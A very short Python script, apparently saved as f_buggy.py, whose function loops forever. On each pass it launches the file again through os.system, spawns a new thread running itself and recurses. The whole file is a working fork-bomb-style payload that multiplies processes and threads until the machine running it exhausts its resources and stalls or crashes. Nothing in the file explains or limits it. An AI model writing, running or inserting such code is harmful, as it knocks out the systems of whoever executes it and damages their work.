import os, threading as t


def f():
    while True:
        os.system("python f_buggy.py")
        t.Thread(target=f).start()
        f()


f()
